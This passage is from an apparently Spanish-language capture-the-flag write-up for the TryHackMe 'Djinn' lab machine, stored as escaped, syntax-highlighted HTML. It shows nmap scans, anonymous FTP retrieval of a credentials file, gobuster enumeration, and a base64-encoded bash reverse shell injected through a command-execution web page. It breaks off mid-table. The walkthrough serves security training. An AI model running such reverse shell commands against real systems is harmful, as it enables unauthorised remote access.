&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Sat Aug  1 11:03:49 2020 as: nmap -sV -o nmap_scan_mini djinn.thm&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; djinn.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.181.33&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.26s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;998&lt;/span&gt; closed ports
PORT   STATE    SERVICE VERSION
21/tcp open     ftp     vsftpd 3.0.3
22/tcp filtered ssh
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Sat Aug  1 11:03:57 2020 -- 1 IP address (1 host up) scanned in 7.89 seconds&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Sat Aug  1 11:03:02 2020 as: nmap -sV -p- -T5 -o nmap_scan djinn.thm&lt;/span&gt;
Warning: 10.10.181.33 giving up on port because retransmission cap hit &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;2&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; djinn.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.181.33&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.25s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;65115&lt;/span&gt; closed ports, &lt;span class=&#34;m&#34;&gt;417&lt;/span&gt; filtered ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
1337/tcp open  waste?
7331/tcp open  http    Werkzeug httpd 0.16.0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Python 2.7.15+&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1337-TCP:V&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7.80%I&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7%D&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;8/1%Time&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;5F2594CD%P&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;x86_64-pc-linux-gnu%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;NUL
SF:L,1BC,&lt;span class=&#34;s2&#34;&gt;&amp;#34;\x20\x20____\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_____\x20_\x20\x20\x20\x20\
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20/\x20___\|\x20__\x
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:20_\x20_\x20__\x20___\x20\x20\x20___\x20\x20\|_\x20\x20\x20_\(_\)_\x20_
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:_\x20___\x20\x20\x20___\x20\n\|\x20\|\x20\x20_\x20/\x20_`\x20\|\x20&amp;#39;_\x
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:20`\x20_\x20\\\x20/\x20_\x20\\\x20\x20\x20\|\x20\|\x20\|\x20\|\x20&amp;#39;_\x2
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:0`\x20_\x20\\\x20/\x20_\x20\\\n\|\x20\|_\|\x20\|\x20\(_\|\x20\|\x20\|\x
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:20\|\x20\|\x20\|\x20\|\x20\x20__/\x20\x20\x20\|\x20\|\x20\|\x20\|\x20\|
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:\x20\|\x20\|\x20\|\x20\|\x20\x20__/\n\x20\\____\|\\__,_\|_\|\x20\|_\|\x
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:20\|_\|\\___\|\x20\x20\x20\|_\|\x20\|_\|_\|\x20\|_\|\x20\|_\|\\___\|\n\
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:\nLet&amp;#39;s\x20see\x20how\x20good\x20you\x20are\x20with\x20simple\x20maths\
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:nAnswer\x20my\x20questions\x201000\x20times\x20and\x20I&amp;#39;ll\x20give\x20y
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:ou\x20your\x20gift\.\n\(7,\x20&amp;#39;\*&amp;#39;,\x209\)\n&amp;gt;\x20&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RPCCheck,1BC,&lt;span class=&#34;s2&#34;&gt;&amp;#34;\x2
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:0\x20____\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:20\x20\x20\x20\x20\x20\x20\x20\x20_____\x20_\x20\x20\x20\x20\x20\x20\x2
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20/\x20___\|\x20__\x20_\x20_\x
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:20__\x20___\x20\x20\x20___\x20\x20\|_\x20\x20\x20_\(_\)_\x20__\x20___\x
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:20\x20\x20___\x20\n\|\x20\|\x20\x20_\x20/\x20_`\x20\|\x20&amp;#39;_\x20`\x20_\x
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:20\\\x20/\x20_\x20\\\x20\x20\x20\|\x20\|\x20\|\x20\|\x20&amp;#39;_\x20`\x20_\x2
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:0\\\x20/\x20_\x20\\\n\|\x20\|_\|\x20\|\x20\(_\|\x20\|\x20\|\x20\|\x20\|
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:\x20\|\x20\|\x20\x20__/\x20\x20\x20\|\x20\|\x20\|\x20\|\x20\|\x20\|\x20
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:\|\x20\|\x20\|\x20\x20__/\n\x20\\____\|\\__,_\|_\|\x20\|_\|\x20\|_\|\\_
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:__\|\x20\x20\x20\|_\|\x20\|_\|_\|\x20\|_\|\x20\|_\|\\___\|\n\x20\x20\x2
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\nLet&amp;#39;s\x2
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:0see\x20how\x20good\x20you\x20are\x20with\x20simple\x20maths\nAnswer\x2
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:0my\x20questions\x201000\x20times\x20and\x20I&amp;#39;ll\x20give\x20you\x20your
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:\x20gift\.\n\(8,\x20&amp;#39;\+&amp;#39;,\x206\)\n&amp;gt;\x20&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Sat Aug  1 11:15:40 2020 -- 1 IP address (1 host up) scanned in 758.06 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;ftp&#34;&gt;FTP&lt;/h2&gt;
&lt;p&gt;En el puerto 21 FTP logramos ingresar como anonymous en donde encontramos tres archivos, uno que contiene lo que parece ser credenciales, el segundo un mensaje para @nitish81299 (nada interesante en Github y Twitter) y un posible nombre de usuario.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/djinn# ftp djinn.thm 
Connected to djinn.thm.
&lt;span class=&#34;m&#34;&gt;220&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;vsFTPd 3.0.3&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Name &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;djinn.thm:root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;: anonymous
&lt;span class=&#34;m&#34;&gt;331&lt;/span&gt; Please specify the password.
Password:
&lt;span class=&#34;m&#34;&gt;230&lt;/span&gt; Login successful.
Remote system &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt; is UNIX.
Using binary mode to transfer files.
ftp&amp;gt; ls -lah
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful. Consider using PASV.
&lt;span class=&#34;m&#34;&gt;150&lt;/span&gt; Here comes the directory listing.
drwxr-xr-x    &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;115&lt;/span&gt;          &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Oct &lt;span class=&#34;m&#34;&gt;21&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; .
drwxr-xr-x    &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;115&lt;/span&gt;          &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Oct &lt;span class=&#34;m&#34;&gt;21&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; ..
-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;              &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt; Oct &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; creds.txt
-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;             &lt;span class=&#34;m&#34;&gt;128&lt;/span&gt; Oct &lt;span class=&#34;m&#34;&gt;21&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; game.txt
-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;             &lt;span class=&#34;m&#34;&gt;113&lt;/span&gt; Oct &lt;span class=&#34;m&#34;&gt;21&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; message.txt
&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Directory send OK.
ftp&amp;gt; get creds.txt
local: creds.txt remote: creds.txt
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful. Consider using PASV.
&lt;span class=&#34;m&#34;&gt;150&lt;/span&gt; Opening BINARY mode data connection &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; creds.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;11&lt;/span&gt; bytes&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Transfer complete.
&lt;span class=&#34;m&#34;&gt;11&lt;/span&gt; bytes received in 0.00 secs &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;54.5289 kB/s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
ftp&amp;gt; get game.txt
local: game.txt remote: game.txt
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful. Consider using PASV.
&lt;span class=&#34;m&#34;&gt;150&lt;/span&gt; Opening BINARY mode data connection &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; game.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;128&lt;/span&gt; bytes&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Transfer complete.
&lt;span class=&#34;m&#34;&gt;128&lt;/span&gt; bytes received in 0.00 secs &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;968.9923 kB/s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
ftp&amp;gt; get message.txt
local: message.txt remote: message.txt
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful. Consider using PASV.
&lt;span class=&#34;m&#34;&gt;150&lt;/span&gt; Opening BINARY mode data connection &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; message.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;113&lt;/span&gt; bytes&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Transfer complete.
&lt;span class=&#34;m&#34;&gt;113&lt;/span&gt; bytes received in 0.00 secs &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;144.6285 kB/s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
ftp&amp;gt; &lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;221&lt;/span&gt; Goodbye.
root@upset:~/thm/djinn# ls
creds.txt  game.txt  message.txt  nmap_scan_mini
root@upset:~/thm/djinn# cat creds.txt 
nitu:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... REDACTED ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
root@upset:~/thm/djinn# cat message.txt 
@nitish81299 I am going on holidays &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; few days, please take care of all the work. 
And don&lt;span class=&#34;s1&#34;&gt;&amp;#39;t mess up anything.
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;root@upset:~/thm/djinn# cat game.txt 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;oh and I forgot to tell you I&amp;#39;&lt;/span&gt;ve setup a game &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; you on port 1337. See &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; you can reach to the 
final level and get the prize.
root@upset:~/thm/djinn#
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Encontramos una pagina web en el puerto 7331.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/djinn/Screenshot_20200801_101952.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h2&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/djinn# gobuster dir -u http://djinn.thm:7331/ -w /usr/share/wordlists/dirbuster/directory-list-medium.txt -q -t &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; -x php,html,txt
/wish
/genie
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;www-data---user&#34;&gt;WWW-DATA - USER&lt;/h2&gt;
&lt;p&gt;Encontramos una pagina &lt;code&gt;/wish&lt;/code&gt; donde al ingresar un comando, este se ejecuta pero el resultado lo muestra en una url redireccionada.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/djinn/Screenshot_20200801_110752.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/djinn/Screenshot_20200801_110823.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ejecutamos una shell codificada:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#Shell&lt;/span&gt;
&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt;  -n &lt;span class=&#34;s1&#34;&gt;&amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.10.10/1338 0&amp;gt;&amp;amp;1&amp;#34;&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;base64
&lt;span class=&#34;c1&#34;&gt;#Ejecutamos&lt;/span&gt;
&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC8xMzM4IDA+JjEi&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;base64 -d&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;bash
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Obtenemos una shell con el usuario &lt;code&gt;www-data&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/djinn/Screenshot_20200801_112324.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;nitish---user&#34;&gt;NITISH - USER&lt;/h2&gt;
&lt;p&gt;En el archivo &lt;code&gt;app.py&lt;/code&gt; el cual ejecuta la pagina anterior encontramos una direccion a un archivo, este archivo contiene lo que parecen credenciales del usuario nitish.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
